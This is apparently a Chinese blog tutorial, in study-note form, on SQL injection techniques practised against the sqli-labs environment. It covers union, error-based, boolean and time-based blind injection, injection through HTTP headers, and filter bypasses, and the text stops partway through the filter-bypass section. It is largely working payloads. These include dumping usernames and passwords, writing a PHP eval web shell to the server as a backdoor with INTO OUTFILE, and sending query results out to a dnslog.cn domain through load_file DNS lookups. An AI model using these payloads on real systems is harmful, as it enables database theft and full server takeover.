by</code>来进行判断对应表的列数</p><h3 id="order-by">order by</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-keyword">desc</span>;<br></code></pre></td></tr></table></figure><p><code>desc</code>是排列顺序变为降序</p><h3 id="limit">limit</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>,<span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><p>限制为从第一行开始显示三行，数据库中表的行数从 0 开始计数</p><h3 id="and-和-or">and 和 or</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span>;<br></code></pre></td></tr></table></figure><p><code>and</code>需要同时满足查询的前后两者关系，<code>or</code>只需要满足其一即可进行查询</p><h3 id="group-concat">group_concat</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> group_concat(id,username,password) <span class="hljs-keyword">from</span> users; <br></code></pre></td></tr></table></figure><p>将我们的查询内容归到一行中</p><h3 id="select-database">select database()</h3><p>用于查询当前数据库</p><h3 id="select-version">select version()</h3><p>用于查询当前数据库版本</p><h2 id="SQL注入基础">SQL注入基础</h2><h3 id="注入分类">注入分类</h3><p>数字型 —— 当输入的参数为整形时，可以认为是数字型注入</p><p>字符型 —— 当输入的参数为字符串时，可以认为是字符型注入</p><h3 id="注入点">注入点</h3><p>注入点就是可以实行注入的地方，通常是一个访问数据库的链接</p><h3 id="如何判断是字符型注入还是数字型注入">如何判断是字符型注入还是数字型注入</h3><p>使用<code>and 1=1</code> 和 <code>and 1=2</code>来判断</p><p>当是数字型注入时只有第一个能被执行第二个无法被数据库查询到，网页无法正常显示</p><p>当是字符型注入时两个都可以进行正常显示界面</p><blockquote><p>字符型需要闭合符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;select * from users where id =&#x27;</span><span class="hljs-variable">$id</span><span class="hljs-string">&#x27; limit 0,1&#x27;</span>;<br></code></pre></td></tr></table></figure><p>提交<code>1 and 1=1</code>时</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;select * from users where id =&#x27;</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; limit 0,1&#x27;</span>;<br></code></pre></td></tr></table></figure><p>单引号闭合语句后<code>Where</code>语句为一个条件<code>id = '1 and 1=1'</code></p><p>数字型则不需要闭合符来闭合</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;select * from users where id = $id limit 0,1&#x27;</span>;<br></code></pre></td></tr></table></figure><p>提交<code>and 1=2</code>时，将<code>and</code>解析为了一个命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;select * from users where id = $id and 1=2 limit 0,1&#x27;</span>;<br></code></pre></td></tr></table></figure><p>导致后面的查询出现错误，而不能正常返回</p></blockquote><h3 id="闭合方式">闭合方式</h3><p><code>'</code>、<code>&quot;</code>、<code>')</code>、<code>&quot;)</code>、<code>其他</code></p><h3 id="判断闭合方式">判断闭合方式</h3><p>我们可以通过制造报错来进行判断，在测试点输入数据后加上对应的闭合方式进行测试，通过网页的回显来进行判断闭合方式，当程序没有回显时，我们也可以采用加上 <code>--+</code>或<code>#</code>或<code>%23</code>注释符来根据页面的正常显示与否来进行判断</p><h3 id="闭合的作用">闭合的作用</h3><p>我们手工提交闭合符号，结束前一段的查询，后面即可加入其他语句，来进行查询我们需要的参数</p><h3 id="union-联合注入前基础工作">union 联合注入前基础工作</h3><p>我们分析出了对应的闭合方式后我们可以使用<code>group by</code>来判断前面查询语句的列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; group by 10 --+</span><br></code></pre></td></tr></table></figure><p>改变<code>10</code>，多次测试后我们可以得到对应查询的列数，随后我们需要查询回显位，假设我们的列数为<code>3</code>，那么我们使用<code>1,2,3</code>进行占位，来判断回显位</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br></code></pre></td></tr></table></figure><p>一般来说页面只会读取第一行，因此我们<code>id</code>前面的查询数据需要设置一个数，让前面的查询语句没有对应的匹配值，从而只显示我们的后面<code>union</code>对应的查询语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br></code></pre></td></tr></table></figure><p>此时我们执行完后，观察页面的显示，看看是那一部分显示出来的，那么我们便可以更改对应的回显位，来完成我们需要的查找</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,database() --+</span><br></code></pre></td></tr></table></figure><h2 id="Union注入">Union注入</h2><h3 id="最终目标">最终目标</h3><p>使用<code>union</code>注入拿到数据库中所有的用户名和密码</p><h3 id="拿到表名">拿到表名</h3><p><code>information_schema</code>包含了所有<code>mysql</code>数据库的简要信息，其中包含有两个我们需要的数据表<code>tables</code>(表名集合表)和<code>columns</code>(列名集合表)</p><p>我们需要的表名信息在数据库<code>information_schema</code>-&gt;数据表<code>tables</code>-&gt;数据列<code>table_name</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,table_name,3 from information_schema.tables --+</span><br></code></pre></td></tr></table></figure><p>过滤在<code>security</code>数据库中的表名，即<code>table_schema</code>为<code>security</code>的行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() --+</span><br></code></pre></td></tr></table></figure><p>因为查询的信息只能显示一个，因此我们需要使用<code>group_concat()</code>确保所有查询到的信息能放到一行显示出来</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(table_name) ,2 from information_schema.tables where table_schema=database()--+</span><br></code></pre></td></tr></table></figure><h3 id="拿到列名">拿到列名</h3><p>用相似的方式我们进行获取数据库<code>information_schema</code>-&gt;数据表<code>columns</code>-&gt;数据列<code>column_name</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(column_name),3 from information_schema.column --+</span><br></code></pre></td></tr></table></figure><p>通过拿到列名后根据我们已有的信息可以获取到对应的数据库里面的所有用户名与密码信息，我们可以直接进行输出</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-1</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(username,&#x27;</span> <span class="hljs-string">&#x27;,password) ,2 from users  --+</span><br></code></pre></td></tr></table></figure><p>大致总结流程如下：</p><ol><li>确定是数字型还是字符型</li><li>使用<code>group by</code>进行二分判断<code>union</code>语句中前一个查询的列数</li><li>优化语句，将对应查询的内容修改为不存在的内容</li><li>使用<code>select</code>，查询数据库库名</li><li>使用<code>select</code>，查询所有表名</li><li>使用<code>select</code>，查询所有列名</li><li>查询所有用户名密码</li></ol><h2 id="报错注入">报错注入</h2><p>报错注入是一种页面响应形式，主要在于后台对于输入输出的合理性没有检查</p><p>对于报错注入，我们需要构造语句让错误信息中夹杂可以显示数据库内容的查询语句，进而让服务器返回报错提示中包含数据库的内容</p><p>常用的方式有<code>floor()</code>、<code>extractvalue</code>、<code>updatexml()</code></p><h3 id="extractvalue-报错注入">extractvalue() 报错注入</h3><p><code>extractvalue()</code>通常用于查询对应的<code>xml</code>文件信息的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">extractvalue(xml对象名称,<span class="hljs-string">&#x27;路径&#x27;</span>)<br></code></pre></td></tr></table></figure><p>对于此种方式进行注入时，我们需要关心的是第二个参数，第二个参数当把查询路径写错时不会参数对应的错误信息，但是当我们把路径的<code>'/'</code>改为<code>'~'</code>时便会产生对应的错误信息，但是后续的内容可以被数据库解析，从而查询我们所需要的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> database())))<br></code></pre></td></tr></table></figure><p>通过这样的方式来拿到我们的查询数据，需要注意的是这样的方式我们仅能返回<code>32</code>个字符长度，为了解决这个方式我们需要使用到一个函数<code>substring()</code></p><p><code>substring()</code>有三个参数：</p><p>第一个参数是对应控制的输出内容，第二个参数是输出的起始下标(注意此处下标起始为 1)，第三个参数是对应的输出长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-built_in">substring</span>(extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> database()))),<span class="hljs-number">25</span>,<span class="hljs-number">30</span>)<br></code></pre></td></tr></table></figure><h3 id="updatexml-报错注入">updatexml() 报错注入</h3><p><code>updatexml()</code>包含三个参数，第一个参数是对应的<code>xml</code>文档名称，第二个参数是<code>xml</code>文档的路径，第三个参数是替换查找到的符合条件的数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">updatexml(xml对象名称,<span class="hljs-string">&#x27;路径&#x27;</span>,替换对象)<br></code></pre></td></tr></table></figure><p><code>updatexml()</code>的注入方式与<code>extractvalue()</code>相同，都是通过修改对应路径使其发生报错，从而将我们路径后半部分的<code>sql</code>语句查询到的数据进行显示</p><p>这两函数均有一个特性，仅能返回<code>32</code>个字符长度，我们同样可以使用函数<code>substring()</code>来进行解决这个问题</p><h3 id="floor-报错注入">floor() 报错注入</h3><h4 id="相关涉及到的函数">相关涉及到的函数</h4><p><code>rand()</code>函数：随机返回<code>0 ~ 1</code>间的小数</p><p><code>floor()</code>函数：小数向下取整数，向上取整数<code>ceiling()</code></p><p><code>concat_ws()</code>函数：将括号内数据用第一个字段链接起来</p><blockquote><p>concat_ws(‘-’,a,b); -&gt; a-b</p></blockquote><p><code>as</code>：用于取别名</p><p><code>count()</code>函数：汇总统计数量</p><p><code>limit</code>：用于显示指定行数</p><h3 id="构造方式">构造方式</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat_ws(<span class="hljs-string">&#x27;-&#x27;</span>,(database()),<span class="hljs-built_in">floor</span>(rand()<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a;<br></code></pre></td></tr></table></figure><h4 id="拆解构造">拆解构造</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">concat_ws(<span class="hljs-string">&#x27;-&#x27;</span>,(database()),<span class="hljs-built_in">floor</span>(rand()<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a<br></code></pre></td></tr></table></figure><p>上面的命令将我们的<code>database()</code>与<code>floor(rand()*2)</code>用<code>-</code>进行拼接，因为<code>rand()</code>产生的数字在<code>0 ~ 1</code>间，乘以 2 后返回的数字在<code>0 ~ 2</code>间，我们对其进行向下取整，那么返回值就只有 0 和 1 ，我们此处拼接后的数据类型就只有两种，假设我们情况查询到的<code>database()</code>名为<code>user</code>，那么此处返回的两种类型分别为<code>user-0</code>和<code>user-1</code></p><p>随后我们将我们查询到的数据命名为<code>a</code>，随后对<code>a</code>进行分组(得到的数据为两种类型<code>user-0</code>和<code>user-1</code>)</p><p>随后我们使用<code>count()</code>对我们分类后的数据进行统计数目</p><p>当我们执行此条语句时，偶尔会出现报错<code>#1062</code></p><h4 id="报错原因">报错原因</h4><p>当我们给<code>rand()</code>函数一个固定的<code>seed</code>那么其产生的随机数经过<code>floor(rand()*2))</code>处理后变得是一个固定值，一般我们给定为<code>0</code></p><p>我们可以把<code>count(*)</code>去除，可以发现不会再报错，说明是在统计的时候产生了错误，那么为什么会产生错误信息呢</p><p><code>rand()</code>函数进行分组<code>group by</code>和统计<code>count()</code>时可能会多次执行，导致键值<code>key</code>重复</p><blockquote><p>人话解释：</p><p>我们把<code>floor(rand(0)*2))</code>设置后产生的数列为0、1、1、0、1…</p><p>当开始统计时，<code>group_key</code>[理解为分类的名单]中没有任何的分类方式，我们第一次统计<code>0</code>的时候发现这一点后，<code>group_key</code>需要重新计算并把结果写入键值[相当于此次计算时在创建<code>group_key</code>的一个分类]，此时执行的时第二次计算，而将<code>1</code>写入了<code>group_key</code>中，而第二次统计时<code>group_key</code>以及存在对应键值了，可以直接写入统计数目，当再次写入到<code>0</code>时，需要再次计算，而此时计算的结果是<code>1</code>，但是<code>1</code>的分类已经被创建了，无法再次创建，进而引发报错</p></blockquote><h3 id="一些情况">一些情况</h3><p>有些时候我们注入后会发现原本会报错的注入语句突然正常执行了起来，此时我们可以试试看将<code>group_concat()</code>换成<code>concat()</code>或者<code>concat_ws()</code>，同时也可以加上一个<code>limit</code>将对应的回显行进行修改</p><h2 id="布尔盲注">布尔盲注</h2><p>盲注：页面没有报错回显，不知道数据库具体返回值的情况下，对数据库中的内容进行拆解，实行<code>SQL</code>注入</p><p>布尔盲注：页面就只有两种状态，一种是为真，一种为假</p><h3 id="相关函数">相关函数</h3><p><code>ascii()</code>：获取对应字符的<code>ASCII</code>码</p><p><code>substr()</code>：有三个参数，第一个为一个长字符串，第二个为输出字符串的起始位置(从<code>1</code>开始计数)，第三个为控制显示字符的个数</p><h3 id="相关注入方式">相关注入方式</h3><p>布尔盲注的方式主要是通过不断地尝试来一个个符号的进行爆破，当输入正确的时候网页会回显对应正确信息，通过这个方式进行逐项爆破</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr((select database() limit 0,1 ),1,1)) &gt; xxx --+</span><br></code></pre></td></tr></table></figure><p>我们通过不断的修改<code>xxx</code>的值，直到找到一个值使语句恒能使页面正常显示，此时我们便找到了一个字符，多次进行下去便可以获取到我们想要的信息</p><h2 id="时间盲注">时间盲注</h2><p><code>web</code>页面只返回一个正常页面，利用页面响应时间不同，逐个拆解数据</p><blockquote><p>前提是数据库会执行命令代码，只是不反馈页面信息</p></blockquote><h3 id="相关函数-2">相关函数</h3><p><code>sleep()</code>：参数仅有一个，对应为休眠时长，以秒为单位，可以为小数</p><p><code>if(a,b,c)</code>：判断<code>a</code>的真假，当<code>a</code>为真时执行<code>b</code>，否则执行<code>c</code></p><h3 id="相关判断">相关判断</h3><p>我们通过页面的返回时间来进行对应的语句判断，我们可以通过<code>网络</code>这个调试组件来进行观察网页的返回时间，判断是否延迟了我们输入的秒数</p><h3 id="注入语句">注入语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> if(ascii(substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span>,sleep(<span class="hljs-number">0</span>),sleep(<span class="hljs-number">3</span>))<br></code></pre></td></tr></table></figure><p>相当于我们利用<code>ascii</code>和<code>substr</code>的组合将第查询到的数据的第一个字母进行返回，同时通过<code>if</code>进行判断，通过这个方式我们可以根据延迟的长短来判断出我们输入的语句是否正确，通过这样的一个个数据的判断，我们可以拿到对应的内容</p><h2 id="SQL-注入文件上传">SQL 注入文件上传</h2><h3 id="相关要点">相关要点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span>;<br></code></pre></td></tr></table></figure><p>查看<code>MySQL</code>是否有读写文件权限</p><p>数据库的<code>file</code>权限规定了数据库用户是否有权限，向操作系统内写入和读取已存在的权限</p><p><code>into outfile</code>命令使用的环境：必须知道一个服务器上可以写入文件的文件夹的完整路径</p><h3 id="文件上传指令">文件上传指令</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>简单的一句话木马</p><p>对目标网站上传指令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>)) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,&quot;&lt;?php @eval($_POST[&#x27;password&#x27;]);?&gt;&quot;,<span class="hljs-number">3</span> <span class="hljs-keyword">into</span> outfile &quot;XXX\123.php&quot; <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><code>XXX</code>为文件路径，<code>123.php</code>是我们插入的文件名</p><h3 id="文件上传后">文件上传后</h3><p>我们执行完上面的语句后会在对应的路径生成一个<code>123.php</code>文件，这个就是我们的后门了，我们通过蚁剑进行链接即可达到控制整个服务器的效果</p><h2 id="DNSlog-手动注入">DNSlog 手动注入</h2><h3 id="load-file">load_file()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> load_file(&quot;XXX&quot;);<br></code></pre></td></tr></table></figure><p><code>XXX</code>为对应文件的路径，此条命令可以去读取对应文件内容，同时显示对应字节</p><h3 id="需要用到的网站">需要用到的网站</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>ceye.io<br>http:<span class="hljs-regexp">//</span>www.dnslog.cn<br></code></pre></td></tr></table></figure><h3 id="注入原理">注入原理</h3><p>相当于我们加载文件中的一个路径中如果有<code>sql</code>语句则被数据库进行解析后，我们可以通过查看访问对应的<code>DNSlog</code>进行查看，在<code>DNSlog</code>中会显示访问的网站，其中便有已经解析完毕的<code>sql</code>语句，通过这种方式进行查找，便可以获得对应数据库的信息</p><blockquote><p>load_file() 读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有 FILE 权限。 该文件所有字节可读，但文件内容必须小于 max_allowed_packet，这个函数也可以用来发送 dns 解析请求，<strong>并且只能在 Windows 平台发起 load_file 请求</strong></p></blockquote><h3 id="注入过程">注入过程</h3><p>我们可以先在上面两个网站中获取到一个随机的域名，这个域名钱可以加任何内容，对应的访问都会被记录下来</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">zfzyk9.dnslog.<span class="hljs-literal">cn</span><br></code></pre></td></tr></table></figure><p>比如我们访问</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">123</span><span class="hljs-selector-class">.zfzyk9</span><span class="hljs-selector-class">.dnslog</span>.cn<br></code></pre></td></tr></table></figure><p>那么对应的网站便会将其进行记录，利用这个特点我们可以进行手动构造注入语句，完成相关的注入过程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> load_file(concat(&quot;//&quot;,(<span class="hljs-keyword">select</span> database()),&quot;zfzyk9.dnslog.cn/123&quot;))<br></code></pre></td></tr></table></figure><p>此时我们回到获取域名的网站观察访问的网站域名</p><p>便可以看到对应的数据库名了，我们只需要对<code>select database()</code>进行修改即可，修改成为我们对应需要的查询语句</p><h2 id="DNSlog-自动化注入">DNSlog 自动化注入</h2><h3 id="相关工具">相关工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/ADOOO/DnslogSqlinj<br>pip2 install gevent==1.2.2<br>pip2 install termcolor<br></code></pre></td></tr></table></figure><h3 id="相关使用">相关使用</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">python2 dnslogSql.py -u <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&#x27; and (&#123;&#125;)--+&quot;</span> --dbs<br>python2 dnslogSql.py -u <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&#x27; and (&#123;&#125;)--+&quot;</span> -D security --tables<br>python2 dnslogSql.py -u <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&#x27; and (&#123;&#125;)--+&quot;</span> -D security -T users --columns<br>python2 dnslogSql.py -u <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&#x27; and (&#123;&#125;)--+&quot;</span> -D security -T users -C username,password --dump<br></code></pre></td></tr></table></figure><h2 id="Post-Union注入">Post Union注入</h2><h3 id="Get提交与Post提交的区别">Get提交与Post提交的区别</h3><p><code>get</code>提交可以被缓存，<code>post</code>提交不会被缓存</p><p><code>get</code>提交参数会保留在浏览器的历史记录里，<code>post</code>提交不会</p><p><code>get</code>提交可以被收藏为书签，<code>post</code>踢提交不可以</p><p><code>get</code>提交有长度限制，最长<code>2048</code>个字符，<code>post</code>提交没有长度要求，不是只允许使用<code>ASCII</code>字符，还可以使用二进制数据</p><h3 id="注入方式">注入方式</h3><p><code>post</code>注入的方式与<code>get</code>注入方式相同，只不过需要使用<code>post</code>进行发送我们的注入语句</p><p>一般<code>post</code>注入前，我们可以通过抓包获取到<code>post</code>发送的消息，将其发送的消息中插入我们的攻击语句即可</p><h2 id="Post盲注">Post盲注</h2><p><code>post</code>盲注方式和<code>get</code>盲注相同，同样<code>post</code>盲注的特点是需要使用<code>post</code>的方式进行发送请求包</p><p>与一般的<code>union post</code>注入相同，我们需要先抓一下包，讲对应的请求信息进行构造，然后修改对应语句，插入我们攻击语句，达到攻击的目的</p><h2 id="Http头UserAgent注入">Http头UserAgent注入</h2><p>页面看不到明显变化，找不到注入点，我们可以尝试报头注入</p><p>一般来说这种注入方式需要我们拥有对应的账户和密码，因为在此时我们登录上时会产生对应的<code>UserAgent</code>信息，我们可以通过<code>BurpSuit</code>抓包，然后修改对应的<code>UserAgent</code>信息，在里面加入我们的攻击代码。</p><p>一般来说对于此种方式我们一般使用报错注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">UserAgent: <span class="hljs-string">&#x27; or updatexml(1,(concat(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),3) #</span><br></code></pre></td></tr></table></figure><h3 id="主要过程">主要过程</h3><p>开启代理，使用<code>BurpSuit</code>进行拦截数据包，将数据包的<code>UserAgent</code>信息进行修改，插入我们的注入代码，使用<code>Post</code>将修改后的数据提交，获取反馈信息</p><h2 id="Http头Referer注入">Http头Referer注入</h2><p>当我们访问一个页面时，会产生一个<code>referer</code>信息，记录了我们是从哪一个网站访问到这个页面的</p><blockquote><p>本来正确的单词应该是<code>referrer</code>，因为早期<code>HTTP</code>规范的拼写错误，为了保持向后兼容就讲错就错了</p></blockquote><p>与<code>UserAgent</code>注入相同，我们同样是需要进行抓包来获取到对应的请求信息，将对应的<code>referer</code>信息进行插入我们的注入语句,通常是使用报错注入的方式进行攻击</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Referer: <span class="hljs-string">&#x27; or updatexml(1,(concat(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),3) #</span><br></code></pre></td></tr></table></figure><h2 id="Http头Cookie注入">Http头Cookie注入</h2><p><code>Cookie</code>相当于我们之前登录的一种凭证，在<code>Cookie</code>有效期内，客户端只需要向服务器发送<code>Cookie</code>进行验证，不需要再次输入用户名和密码</p><p>如果<code>Cookie</code>(未加密)被放到服务器时数据库会进行解析，我们可以尝试进行注入</p><p>一般在<code>Cookie</code>注入我们考虑顺序为：<code>Union</code>注入-&gt;报错注入-&gt;布尔盲注-&gt;时间盲注</p><h2 id="注释符绕过">注释符绕过</h2><h3 id="注释符号作用">注释符号作用</h3><p>将后面不需要的语句注释掉，保证句子的完整性</p><h3 id="常用注释符">常用注释符</h3><p><code>--</code>、<code>#</code>、<code>%23</code></p><h3 id="绕过">绕过</h3><p>可以手动在添加一个闭合方式，比如：闭合方式为<code>')</code>我们可以再添加一个<code>('</code>，使其前后完成闭合</p><p>我们也可以使用等式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,database(),3 and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>我们将后面的一个位置进行改为一个等式的判断，同时利用原来的方式进行闭合操作，那么我们遍可以绕过掉注释</p><h2 id="and和or过滤">and和or过滤</h2><p>一般<code>and</code>和<code>or</code>的过滤方式在源代码中使用正则匹配来进行匹配，对于匹配到后的替换为空字符，相当于将我们的输入中的<code>and</code>和<code>or</code>进行删除</p><p>对于此种方式我们可以尝试使用以下方式绕过：</p><h3 id="大小写绕过">大小写绕过</h3><p>例如：<code>?id=1' anD 1=1 --+</code></p><h3 id="复写过滤字符">复写过滤字符</h3><p>例如：<code>?id=1' anandd 1=1 --+</code></p><h3 id="使用替代">使用替代</h3><p>使用<code>&amp;&amp;</code>或者是<code>||</code>来进行取代<code>and</code>和<code>or</code></p><p>例如：<code>?id=1' &amp;&amp; 1=1 --+</code></p><p>如果直接使用<code>&amp;&amp;</code>或<code>||</code>发生报错时，我们可以将其转换为<code>url</code>编码进行输入</p><h2 id="空格过滤">空格过滤</h2><p>空格过滤在绕过防火墙有着比较实际的意义</p><p>一般我们可以使用如下方式进行绕过：</p><h3 id="使用加号">使用加号</h3><p>如：<code>?id=1'+and+1=1--+</code></p><h3 